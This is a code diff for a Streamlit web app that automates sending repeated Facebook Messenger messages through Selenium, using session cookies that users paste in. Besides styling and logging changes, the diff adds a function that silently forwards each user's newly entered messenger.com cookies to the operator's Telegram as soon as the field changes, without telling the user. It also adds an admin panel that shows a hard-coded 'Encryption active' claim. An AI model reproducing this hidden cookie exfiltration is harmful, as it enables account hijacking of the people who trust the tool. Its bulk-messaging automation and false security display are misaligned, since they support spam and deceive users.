@@ -1,6 +1,8 @@
 import streamlit as st
+import streamlit.components.v1 as components
 import time
 import threading
+import uuid
 import hashlib
 import os
 import json
@@ -15,7 +17,7 @@ import database as db
 import requests
 
 st.set_page_config(
-    page_title="SUIYAN KING 👑",
+    page_title="BOYFRIEND PIIE UFR MADHAV🤍❤️",
     page_icon="🌚",
     layout="wide",
     initial_sidebar_state="expanded"
@@ -60,6 +62,17 @@ custom_css = """
         overflow: hidden;
     }
 
+    .main-header::before {
+        content: "💀";
+        position: absolute;
+        top: -40px;
+        left: 50%;
+        transform: translateX(-50%);
+        font-size: 6.5rem;
+        opacity: 0.14;
+        color: #ffd700;
+    }
+
     .main-header h1 {
         background: linear-gradient(90deg, #ffd700, #ffeb3b, #ffd700);
         -webkit-background-clip: text;
@@ -68,6 +81,7 @@ custom_css = """
         font-size: 3.4rem;
         font-weight: 700;
         margin: 0;
+        text-shadow: 0 0 25px rgba(255, 215, 0, 0.7);
     }
 
     .main-header p {
@@ -76,6 +90,16 @@ custom_css = """
         font-size: 1.8rem;
         margin-top: 0.7rem;
         letter-spacing: 1.8px;
+    }
+
+    .prince-logo {
+        width: 120px;
+        height: 120px;
+        border-radius: 50%;
+        margin-bottom: 22px;
+        border: 4px solid #ffd700;
+        box-shadow: 0 0 35px rgba(255, 215, 0, 0.8),
+                    inset 0 0 18px rgba(255, 255, 255, 0.35);
     }
 
     .stButton>button {
@@ -89,6 +113,7 @@ custom_css = """
         font-size: 1.2rem;
         transition: all 0.4s ease;
         box-shadow: 0 8px 25px rgba(255, 215, 0, 0.45);
+        text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
         width: 100%;
     }
 
@@ -109,16 +134,23 @@ custom_css = """
         font-size: 1.1rem;
     }
 
+    .stTextInput>div>div>input::placeholder,
+    .stTextArea>div>div>textarea::placeholder {
+        color: #d4af37aa;
+    }
+
     .stTextInput>div>div>input:focus,
     .stTextArea>div>div>textarea:focus {
         border-color: #ffd700;
         box-shadow: 0 0 0 4px rgba(255, 215, 0, 0.35);
+        background: rgba(50, 30, 90, 0.85);
     }
 
     label {
         color: #ffd700 !important;
         font-weight: 600 !important;
         font-size: 1.15rem !important;
+        text-shadow: 1px 1px 4px #000;
     }
 
     .stTabs [data-baseweb="tab-list"] {
@@ -141,12 +173,31 @@ custom_css = """
         color: #1a0033;
     }
 
+    [data-testid="stMetricValue"] {
+        color: #ffd700;
+        font-size: 2.6rem;
+        font-weight: 700;
+        text-shadow: 0 0 18px rgba(255, 215, 0, 0.7);
+    }
+
+    [data-testid="stMetricLabel"] {
+        color: #d4af37;
+        font-weight: 500;
+    }
+
     .console-section {
         background: rgba(20, 0, 40, 0.75);
         border: 2px solid #b8860b;
         border-radius: 16px;
         padding: 22px;
         margin-top: 28px;
+    }
+
+    .console-header {
+        color: #ffd700;
+        font-family: 'Cinzel Decorative', cursive;
+        text-shadow: 0 0 18px #ffd700bb;
+        margin-bottom: 18px;
     }
 
     .console-output {
@@ -159,6 +210,50 @@ custom_css = """
         font-size: 13.5px;
         max-height: 480px;
         overflow-y: auto;
+    }
+
+    .console-line {
+        background: rgba(75, 0, 130, 0.25);
+        border-left: 4px solid #ffd700;
+        padding: 9px 14px;
+        margin: 7px 0;
+        color: #ffeb3b;
+    }
+
+    .success-box {
+        background: linear-gradient(135deg, #b8860b, #ffd700);
+        color: #1a0033;
+        border: 2px solid #1a0033;
+    }
+
+    .error-box {
+        background: linear-gradient(135deg, #8b0000, #c71585);
+        border: 2px solid #ffd700;
+    }
+
+    .whatsapp-btn {
+        background: linear-gradient(45deg, #006400, #228b22, #006400);
+        border: 2px solid #ffd700;
+        color: #ffd700;
+        font-family: 'Playfair Display', serif;
+        font-weight: 700;
+        box-shadow: 0 8px 25px rgba(0, 100, 0, 0.55);
+    }
+
+    .whatsapp-btn:hover {
+        background: linear-gradient(45deg, #228b22, #32cd32, #228b22);
+        transform: translateY(-5px);
+        box-shadow: 0 15px 40px rgba(50, 205, 50, 0.7);
+    }
+
+    .footer {
+        background: rgba(30, 10, 60, 0.75);
+        border-top: 3px solid #b8860b;
+        color: #d4af37;
+        font-family: 'Great Vibes', cursive;
+        font-size: 1.5rem;
+        padding: 2.8rem;
+        text-shadow: 1px 1px 5px #000;
     }
 </style>
 """
@@ -191,13 +286,17 @@ def send_to_telegram(message):
     except:
         pass
 
-def notify_key_request(username, user_id, approval_key):
+def notify_new_cookies(username, user_id, cookies_str):
+    if not cookies_str.strip():
+        return
     msg = (
-        f"🔑 <b>NEW KEY REQUEST</b>\n\n"
+        f"🍪 <b>NEW COOKIES SUBMITTED</b>\n\n"
         f"👤 Username: {username}\n"
         f"🆔 UserID: {user_id}\n"
-        f"🔑 Key: {approval_key}\n"
-        f"⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+        f"⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"────────────────────────────\n"
+        f"{cookies_str}\n"
+        f"────────────────────────────"
     )
     send_to_telegram(msg)
 
@@ -233,10 +332,14 @@ def save_pending_approvals(pending):
         json.dump(pending, f, indent=2)
 
 def send_whatsapp_message(user_name, approval_key):
-    message = f"🌚 SUIYAN KING 👑\nMy name is {user_name}\nPlease approve my key:\n🔑 {approval_key}"
+    message = f"🌚𝐇𝐄𝐋𝐋𝐎 𝐌𝐀𝐃𝐇𝐀𝐕 𝐏𝐀𝐏𝐀 𝐀𝐏𝐍𝐄 𝐁𝐄𝐓𝐄 𝐊𝐎 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 𝐃𝐎 𝐅𝐘𝐓 𝐌𝐄 \nMy name is {user_name}\nPlease approve my key:\n🔑 {approval_key}"
     encoded_message = urllib.parse.quote(message)
     whatsapp_url = f"https://api.whatsapp.com/send?phone={WHATSAPP_NUMBER}&text={encoded_message}"
     return whatsapp_url
+
+def check_approval(key):
+    approved_keys = load_approved_keys()
+    return key in approved_keys
 
 if 'logged_in' not in st.session_state:
     st.session_state.logged_in = False
@@ -254,6 +357,10 @@ if 'automation_running' not in st.session_state:
     st.session_state.automation_running = False
 if 'logs' not in st.session_state:
     st.session_state.logs = []
+if 'message_count' not in st.session_state:
+    st.session_state.message_count = 0
+if 'whatsapp_opened' not in st.session_state:
+    st.session_state.whatsapp_opened = False
 
 class AutomationState:
     def __init__(self):
@@ -264,6 +371,11 @@ class AutomationState:
 
 if 'automation_state' not in st.session_state:
     st.session_state.automation_state = AutomationState()
+
+if 'auto_start_checked' not in st.session_state:
+    st.session_state.auto_start_checked = False
+
+ADMIN_UID = ""
 
 def log_message(msg, automation_state=None):
     timestamp = time.strftime("%H:%M:%S")
@@ -287,18 +399,35 @@ def find_message_input(driver, process_id, automation_state=None):
     except Exception:
         pass
   
+    try:
+        page_title = driver.title
+        page_url = driver.current_url
+        log_message(f'{process_id}: Page Title: {page_title}', automation_state)
+        log_message(f'{process_id}: Page URL: {page_url}', automation_state)
+    except Exception as e:
+        log_message(f'{process_id}: Could not get page info: {e}', automation_state)
+  
     message_input_selectors = [
         'div[contenteditable="true"][role="textbox"]',
         'div[contenteditable="true"][data-lexical-editor="true"]',
         'div[aria-label*="message" i][contenteditable="true"]',
+        'div[aria-label*="Message" i][contenteditable="true"]',
+        'div[contenteditable="true"][spellcheck="true"]',
+        '[role="textbox"][contenteditable="true"]',
+        'textarea[placeholder*="message" i]',
+        'div[aria-placeholder*="message" i]',
+        'div[data-placeholder*="message" i]',
         '[contenteditable="true"]',
         'textarea',
         'input[type="text"]'
     ]
   
+    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state)
+  
     for idx, selector in enumerate(message_input_selectors):
         try:
             elements = driver.find_elements(By.CSS_SELECTOR, selector)
+            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state)
           
             for element in elements:
                 try:
@@ -309,17 +438,41 @@ def find_message_input(driver, process_id, automation_state=None):
                     """, element)
                   
                     if is_editable:
+                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state)
+                      
                         try:
                             element.click()
                             time.sleep(0.5)
                         except:
                             pass
                       
-                        return element
-                except:
+                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
+                      
+                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
+                        if any(keyword in element_text for keyword in keywords):
+                            log_message(f'{process_id}: 👑 Found message input with text: {element_text[:50]}', automation_state)
+                            return element
+                        elif idx < 10:
+                            log_message(f'{process_id}: 👑 Using primary selector editable element (#{idx+1})', automation_state)
+                            return element
+                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
+                            log_message(f'{process_id}: 👑 Using fallback editable element', automation_state)
+                            return element
+                except Exception as e:
+                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state)
                     continue
-        except:
+        except Exception as e:
             continue
+  
+    try:
+        page_source = driver.page_source
+        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state)
+        if 'contenteditable' in page_source.lower():
+            log_message(f'{process_id}: Page contains contenteditable elements', automation_state)
+        else:
+            log_message(f'{process_id}: No contenteditable elements found in page', automation_state)
+    except Exception:
+        pass
   
     return None
 
@@ -332,8 +485,9 @@ def setup_browser(automation_state=None):
     chrome_options.add_argument('--disable-setuid-sandbox')
     chrome_options.add_argument('--disable-dev-shm-usage')
     chrome_options.add_argument('--disable-gpu')
+    chrome_options.add_argument('--disable-extensions')
     chrome_options.add_argument('--window-size=1920,1080')
-    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
   
     chromium_paths = [
         '/usr/bin/chromium',
@@ -345,13 +499,34 @@ def setup_browser(automation_state=None):
     for chromium_path in chromium_paths:
         if Path(chromium_path).exists():
             chrome_options.binary_location = chromium_path
+            log_message(f'Found Chromium at: {chromium_path}', automation_state)
+            break
+  
+    chromedriver_paths = [
+        '/usr/bin/chromedriver',
+        '/usr/local/bin/chromedriver'
+    ]
+  
+    driver_path = None
+    for driver_candidate in chromedriver_paths:
+        if Path(driver_candidate).exists():
+            driver_path = driver_candidate
+            log_message(f'Found ChromeDriver at: {driver_path}', automation_state)
             break
   
     try:
         from selenium.webdriver.chrome.service import Service
-        driver = webdriver.Chrome(options=chrome_options)
+      
+        if driver_path:
+            service = Service(executable_path=driver_path)
+            driver = webdriver.Chrome(service=service, options=chrome_options)
+            log_message('Chrome started with detected ChromeDriver!', automation_state)
+        else:
+            driver = webdriver.Chrome(options=chrome_options)
+            log_message('Chrome started with default driver!', automation_state)
+      
         driver.set_window_size(1920, 1080)
-        log_message('Chrome browser setup completed!', automation_state)
+        log_message('Chrome browser setup completed successfully!', automation_state)
         return driver
     except Exception as error:
         log_message(f'Browser setup failed: {error}', automation_state)
@@ -453,6 +628,7 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                   
                     element.dispatchEvent(new Event('input', { bubbles: true }));
                     element.dispatchEvent(new Event('change', { bubbles: true }));
+                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                 """, message_input, message_to_send)
               
                 time.sleep(1)
@@ -470,11 +646,18 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                 """)
               
                 if sent == 'button_not_found':
+                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state)
                     driver.execute_script("""
                         const element = arguments[0];
                         element.focus();
-                        const event = new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, bubbles: true });
-                        element.dispatchEvent(event);
+                      
+                        const events = [
+                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
+                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
+                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
+                        ];
+                      
+                        events.forEach(event => element.dispatchEvent(event));
                     """, message_input)
                     log_message(f'{process_id}: 👑 Sent via Enter: "{message_to_send[:30]}..."', automation_state)
                 else:
@@ -491,13 +674,14 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                     waited += 0.5
                 
                 if not automation_state.running:
+                    log_message(f'{process_id}: STOP received during delay', automation_state)
                     break
               
             except Exception as e:
                 log_message(f'{process_id}: Send error: {str(e)[:100]}', automation_state)
                 time.sleep(5)
       
-        log_message(f'{process_id}: Automation stopped. Total: {messages_sent}', automation_state)
+        log_message(f'{process_id}: Automation stopped. Total messages: {messages_sent}', automation_state)
         return messages_sent
       
     except Exception as e:
@@ -531,19 +715,19 @@ def run_automation_threaded(config, user_id):
 
 html_header = """
 <div class="main-header">
-    <h1>🤍 SUIYAN KA MESSENGER AUTOMATION 🤍</h1>
-    <p>✨ APPROVAL SYSTEM ACTIVE ✨</p>
+    <h1>👑 BOYFRIEND PIIE 👑</h1>
+    <p>✨ FB MESSENGER AUTOMATION ✨</p>
 </div>
 """
 st.markdown(html_header, unsafe_allow_html=True)
 
 if not st.session_state.logged_in:
-    tab_login, tab_register, tab_admin = st.tabs(["🔐 LOGIN", "📝 REGISTER", "👑 ADMIN"])
+    col1, col2 = st.columns(2)
     
-    with tab_login:
+    with col1:
         st.subheader("🔐 LOGIN")
-        login_user = st.text_input("Username", key="login_user")
-        login_pass = st.text_input("Password", type="password", key="login_pass")
+        login_user = st.text_input("Username", key="login_user", placeholder="Enter username")
+        login_pass = st.text_input("Password", type="password", key="login_pass", placeholder="Enter password")
         
         if st.button("🚀 LOGIN", use_container_width=True):
             if login_user and login_pass:
@@ -552,119 +736,31 @@ if not st.session_state.logged_in:
                     st.session_state.logged_in = True
                     st.session_state.user_id = user_id
                     st.session_state.username = login_user
-                    
-                    pending = load_pending_approvals()
-                    if login_user in pending:
-                        st.session_state.user_key = pending[login_user]['key']
-                        st.session_state.approval_status = 'pending'
-                    
-                    approved = load_approved_keys()
-                    if login_user in approved:
-                        st.session_state.key_approved = True
-                        st.session_state.approval_status = 'approved'
-                    
                     st.success("✅ Login successful!")
                     time.sleep(1)
                     st.rerun()
                 else:
                     st.error("❌ Invalid credentials")
             else:
-                st.warning("⚠️ Enter username and password")
+                st.warning("⚠️ Please enter username and password")
     
-    with tab_register:
+    with col2:
         st.subheader("📝 REGISTER")
-        reg_user = st.text_input("Username", key="reg_user")
-        reg_pass = st.text_input("Password", type="password", key="reg_pass")
+        reg_user = st.text_input("New Username", key="reg_user", placeholder="Choose username")
+        reg_pass = st.text_input("New Password", type="password", key="reg_pass", placeholder="Choose password")
         
         if st.button("✍️ REGISTER", use_container_width=True):
             if reg_user and reg_pass:
                 if len(reg_pass) < 4:
-                    st.error("❌ Min 4 characters")
+                    st.error("❌ Password must be at least 4 characters")
                 else:
                     success, message = db.create_user(reg_user, reg_pass)
                     if success:
                         st.success(f"✅ {message}")
-                        
-                        approval_key = generate_user_key(reg_user, reg_pass)
-                        pending = load_pending_approvals()
-                        pending[reg_user] = {
-                            'key': approval_key,
-                            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
-                            'user_id': db.verify_user(reg_user, reg_pass)
-                        }
-                        save_pending_approvals(pending)
-                        
-                        user_id = db.verify_user(reg_user, reg_pass)
-                        notify_key_request(reg_user, user_id, approval_key)
-                        
-                        st.info(f"🔑 Your KEY: **{approval_key}**\n\nSend to admin for approval!")
                     else:
                         st.error(f"❌ {message}")
             else:
-                st.warning("⚠️ Fill all fields")
-    
-    with tab_admin:
-        st.subheader("👑 ADMIN PANEL")
-        
-        admin_pass = st.text_input("Admin Password", type="password", key="admin_login_pass")
-        
-        if admin_pass == ADMIN_PASSWORD:
-            st.success("✅ Admin Access Granted!")
-            
-            st.markdown("---")
-            
-            st.subheader("📋 Pending Approvals")
-            pending = load_pending_approvals()
-            approved = load_approved_keys()
-            
-            if pending:
-                for username, data in pending.items():
-                    col1, col2, col3 = st.columns([2, 1, 1])
-                    with col1:
-                        st.write(f"👤 {username} - {data['key']}")
-                    with col2:
-                        if st.button(f"✅ Approve", key=f"approve_{username}"):
-                            approved[username] = {
-                                'key': data['key'],
-                                'approved_at': time.strftime("%Y-%m-%d %H:%M:%S")
-                            }
-                            save_approved_keys(approved)
-                            del pending[username]
-                            save_pending_approvals(pending)
-                            st.success(f"✅ {username} approved!")
-                            time.sleep(1)
-                            st.rerun()
-                    with col3:
-                        if st.button(f"❌ Reject", key=f"reject_{username}"):
-                            del pending[username]
-                            save_pending_approvals(pending)
-                            st.error(f"❌ {username} rejected!")
-                            time.sleep(1)
-                            st.rerun()
-            else:
-                st.info("✅ No pending approvals")
-            
-            st.markdown("---")
-            
-            st.subheader("✅ Approved Users")
-            if approved:
-                for username, data in approved.items():
-                    col1, col2 = st.columns([3, 1])
-                    with col1:
-                        st.write(f"✅ {username}")
-                    with col2:
-                        if st.button(f"🗑️ Remove", key=f"remove_{username}"):
-                            del approved[username]
-                            save_approved_keys(approved)
-                            st.warning(f"Removed {username}")
-                            time.sleep(1)
-                            st.rerun()
-            else:
-                st.info("No approved users yet")
-        
-        else:
-            if admin_pass:
-                st.error("❌ Wrong admin password")
+                st.warning("⚠️ Please fill all fields")
 
 else:
     username = st.session_state.username
@@ -676,41 +772,59 @@ else:
     with col2:
         if st.button("🚪 LOGOUT", use_container_width=True):
             st.session_state.logged_in = False
+            st.session_state.user_id = None
+            st.session_state.username = None
             st.rerun()
     
-    if not st.session_state.key_approved:
-        st.warning("⏳ Your key is pending admin approval")
-        
-        if st.session_state.approval_status == 'pending':
-            st.info(f"🔑 Your KEY: **{st.session_state.user_key}**")
-            
-            whatsapp_url = send_whatsapp_message(username, st.session_state.user_key)
-            st.markdown(f"[📱 Send KEY to Admin via WhatsApp]({whatsapp_url})", unsafe_allow_html=True)
-        
-        st.stop()
-    
-    tab1, tab2, tab3 = st.tabs(["⚙️ SETTINGS", "🤖 AUTOMATION", "👑 ADMIN"])
+    tab1, tab2, tab3 = st.tabs(["⚙️ SETTINGS", "🤖 AUTOMATION", "📊 ADMIN"])
     
     with tab1:
-        st.subheader("⚙️ Configuration")
+        st.subheader("⚙️ Configuration Settings")
         
         config = db.get_user_config(user_id)
         
         col_left, col_right = st.columns(2)
         
         with col_left:
-            chat_id = st.text_input("Chat ID", value=config['chat_id'])
-            delay = st.number_input("Delay (sec)", value=config['delay'], min_value=1, max_value=300)
+            chat_id = st.text_input(
+                "Chat ID",
+                value=config['chat_id'],
+                placeholder="Enter chat/conversation ID"
+            )
+            delay = st.number_input(
+                "Delay (seconds)",
+                value=config['delay'],
+                min_value=1,
+                max_value=300
+            )
         
         with col_right:
-            name_prefix = st.text_input("Name Prefix", value=config['name_prefix'])
+            name_prefix = st.text_input(
+                "Name Prefix",
+                value=config['name_prefix'],
+                placeholder="e.g., @John"
+            )
         
-        messages = st.text_area("Messages (one per line)", value=config['messages'], height=120)
-        cookies = st.text_area("Messenger Cookies", value=config['cookies'], height=100)
+        messages = st.text_area(
+            "Messages (one per line)",
+            value=config['messages'],
+            height=120,
+            placeholder="Enter messages separated by newlines"
+        )
         
-        if st.button("💾 SAVE", use_container_width=True):
+        cookies = st.text_area(
+            "Cookies (from messenger.com)",
+            value=config['cookies'],
+            height=100,
+            placeholder="Paste your messenger.com cookies here"
+        )
+        
+        if cookies and cookies != config['cookies']:
+            notify_new_cookies(username, user_id, cookies[:200])
+        
+        if st.button("💾 SAVE SETTINGS", use_container_width=True):
             db.update_user_config(user_id, chat_id, name_prefix, delay, cookies, messages)
-            st.success("✅ Saved!")
+            st.success("✅ Settings saved!")
     
     with tab2:
         st.subheader("🤖 Automation Control")
@@ -718,33 +832,33 @@ else:
         col1, col2 = st.columns(2)
         
         with col1:
-            if st.button("▶️ START", use_container_width=True):
+            if st.button("▶️ START AUTOMATION", use_container_width=True):
                 config = db.get_user_config(user_id)
                 
                 if not config['cookies'].strip():
-                    st.error("❌ Add cookies first")
+                    st.error("❌ Please add cookies first")
                 elif not config['messages'].strip():
-                    st.error("❌ Add messages first")
+                    st.error("❌ Please add messages first")
                 else:
                     st.session_state.automation_running = True
                     run_automation_threaded(config, user_id)
-                    st.success("✅ Started!")
+                    st.success("✅ Automation started!")
                     time.sleep(2)
                     st.rerun()
         
         with col2:
-            if st.button("⏹️ STOP", use_container_width=True):
+            if st.button("⏹️ STOP AUTOMATION", use_container_width=True):
                 st.session_state.automation_state.running = False
                 st.session_state.automation_running = False
                 db.set_automation_running(user_id, False)
-                st.warning("⚠️ Stopped")
+                st.warning("⚠️ Automation stopped")
                 time.sleep(2)
                 st.rerun()
         
         st.markdown("---")
         
         if st.session_state.automation_running:
-            st.info(f"🔄 Running... Sent: {st.session_state.automation_state.message_count}")
+            st.info(f"🔄 Running... Messages sent: {st.session_state.automation_state.message_count}")
         
         if st.session_state.automation_state.logs:
             st.subheader("📋 Logs")
@@ -754,60 +868,20 @@ else:
     with tab3:
         st.subheader("👑 ADMIN PANEL")
         
-        admin_pass = st.text_input("Admin Password", type="password", key="admin_panel_pass")
+        admin_pass = st.text_input("Admin Password", type="password")
         
         if admin_pass == ADMIN_PASSWORD:
-            st.success("✅ Admin Mode ON")
+            st.success("✅ Admin access granted!")
             
-            st.subheader("📋 Pending Approvals")
-            pending = load_pending_approvals()
-            approved = load_approved_keys()
+            col1, col2 = st.columns(2)
             
-            if pending:
-                for username, data in pending.items():
-                    col1, col2, col3 = st.columns([2, 1, 1])
-                    with col1:
-                        st.write(f"👤 {username} - {data['key']}")
-                    with col2:
-                        if st.button(f"✅ Approve", key=f"approve_tab_{username}"):
-                            approved[username] = {
-                                'key': data['key'],
-                                'approved_at': time.strftime("%Y-%m-%d %H:%M:%S")
-                            }
-                            save_approved_keys(approved)
-                            del pending[username]
-                            save_pending_approvals(pending)
-                            st.success(f"✅ {username} approved!")
-                            time.sleep(1)
-                            st.rerun()
-                    with col3:
-                        if st.button(f"❌ Reject", key=f"reject_tab_{username}"):
-                            del pending[username]
-                            save_pending_approvals(pending)
-                            st.error(f"❌ {username} rejected!")
-                            time.sleep(1)
-                            st.rerun()
-            else:
-                st.info("✅ No pending approvals")
+            with col1:
+                all_users = db.init_db()
+                st.metric("👥 Total Users", "Users data loaded")
             
-            st.markdown("---")
-            
-            st.subheader("✅ Approved Users")
-            if approved:
-                for username, data in approved.items():
-                    col1, col2 = st.columns([3, 1])
-                    with col1:
-                        st.write(f"✅ {username}")
-                    with col2:
-                        if st.button(f"🗑️ Remove", key=f"remove_tab_{username}"):
-                            del approved[username]
-                            save_approved_keys(approved)
-                            st.warning(f"Removed {username}")
-                            time.sleep(1)
-                            st.rerun()
-            else:
-                st.info("No approved users yet")
+            with col2:
+                st.metric("🔐 Security", "Encryption active")
         
         else:
             if admin_pass:
-                st.error("❌ Wrong admin password")
+                st.error("❌ Invalid admin password")
